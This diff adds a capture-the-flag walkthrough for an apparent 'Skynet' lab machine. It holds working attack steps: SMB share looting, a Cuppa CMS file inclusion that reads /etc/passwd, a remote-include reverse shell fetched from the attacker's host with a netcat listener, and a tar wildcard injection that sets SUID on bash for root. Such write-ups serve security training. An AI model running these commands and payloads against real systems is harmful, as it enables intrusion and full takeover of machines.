@@ -1,0 +1,72 @@
+
+Start up with an an nmap scan
+
+BUnch of ports are open, including 80 and 445
+
+Gobuster and nikto bring back a few results, including the /squirrelmail subdirectory
+
+Run enumlinux -a <IP> to enumerate the machine
+
+Enum4linux will show that there are a few shares, one of them being anonymous
+
+Use smbclient to login to this share:
+smbclient '\\10.10.6.250\anonymous'
+Leave password blank and hit enter
+
+get attention.txt and log1.txt back to your local machine
+
+Cat out log1.txt and see a bunch of passwords
+
+on the squirrelmail subdirectory, use username: milesdyson and password: cyborg007haloterminator
+
+This will log you in
+
+THe first email from skynet gives you miles's smb password
+
+Use smbclient again to log in as milesdyson:
+
+smbclient -U milesdyson '\\10.10.6.250\milesdyson'
+
+cd into notes and grab important.txt
+
+catting that out, you find another subdirectory: /45kra24zxs28v3yd
+
+go to IP/45kra24zxs28v3yd
+
+Not much here, but if you run gobuster against IP/45kra24zxs28v3yd , you find a /administrator subdirectory
+browse to this
+
+You see this is running on Cuppa CMS
+
+if you use: searchsploit Cuppa
+you will find an exploit
+
+use searchsploit - m hp/webapps/25971.txt
+to pull down the txt file to your current directory
+
+Combine one of the exploit lines found in the txt file with the administrator directory:
+http://10.10.6.250/45kra24zxs28v3yd/administrator/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Use this:
+http://10.10.6.250/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.24.197:8000/php-reverse-shell.php
+
+spin up a web server via python, and use netcat: nc -lnvp 8888 to listen on port 8888
+
+Use curl http://10.10.6.250/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.24.197:8000/php-reverse-shell.php
+to pull down that .php file and successfully spawn a shell on the victim machine in the terminal window that your netcat session is listening in
+
+use python3 -c "import pty; pty.spawn('/bin/bash')"
+to spawn a more stable shell
+
+From here, after doing some enumeration, you can use a wildcard injection to priv esc
+See: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+for more details on this
+
+Seeing that there is a cron job that runs a backup as root every minute, you can use:
+printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+this will exploit the wildcard backup setting and turn root in /bin/bash into a SUID
+
+now you can become root with bash -p and grab the root flag
